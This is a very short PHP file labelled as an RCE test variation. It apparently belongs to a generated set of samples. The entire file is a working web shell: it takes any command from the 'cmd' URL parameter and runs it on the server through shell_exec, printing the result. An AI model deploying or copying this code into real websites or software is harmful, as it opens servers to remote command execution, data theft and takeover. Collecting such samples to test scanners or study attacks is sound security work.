<?php
// RCE test variation #834
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>